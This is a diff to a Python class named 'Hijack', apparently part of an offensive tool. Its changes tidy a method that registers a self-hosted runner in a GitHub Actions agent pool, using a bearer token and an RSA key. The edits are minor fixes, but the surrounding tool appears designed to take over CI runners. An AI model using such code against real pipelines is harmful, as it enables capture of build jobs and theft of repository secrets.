@@ -244,8 +244,7 @@ class Hijack:
         return None
 
     def registerRunner(self, url, token, update=False):
-
-        defaultLables = [
+        defaultLabels = [
             {
                 "id": 0,
                 "name": "self-hosted",
@@ -262,9 +261,9 @@ class Hijack:
                 "type": "system"
             }
         ]
-
+    
         labels = []
-        if self.labels != None:
+        if self.labels is not None:
             for l in self.labels.split(","):
                 labels.append({
                     "id": 0,
@@ -272,9 +271,8 @@ class Hijack:
                     "type": "user"
                 })
         else:
-            labels = defaultLables
-        
-
+            labels = defaultLabels
+    
         self._session.headers.update({"Authorization": f"Bearer {token}"})
         data = { 
             "labels": labels,
@@ -282,8 +280,8 @@ class Hijack:
             "createdOn": "0001-01-01T00:00:00",
             "authorization": {
                 "publicKey": {
-                    "exponent": b64encode(long_to_bytes(self._rsaKey.e)),
-                    "modulus": b64encode(long_to_bytes(self._rsaKey.n))
+                    "exponent": b64encode(long_to_bytes(self._rsaKey.e)).decode('utf-8'),
+                    "modulus": b64encode(long_to_bytes(self._rsaKey.n)).decode('utf-8')
                 }
             },
             "id": 0,
@@ -295,17 +293,15 @@ class Hijack:
             "status": 0,
             "provisioningState": "Provisioned"
         }
-
+    
         if update:
             res = self._session.put(f"{url}_apis/distributedtask/pools/{self._runnerPoolId}/agents", json=data)
         else:
             res = self._session.post(f"{url}_apis/distributedtask/pools/{self._runnerPoolId}/agents", json=data)
-
+    
         if res.status_code == 200:
             self._authorizationUrl = res.json().get("authorization").get("authorizationUrl")
             self._clientId = res.json().get("authorization").get("clientId")
-            #print(f"[+] clientId: {self._clientId}")
-            #print(f"[+] authorizationUrl: {self._authorizationUrl}")
             return True
         elif res.status_code == 409:
             print(f"[+] error: {res.json().get('message')}")
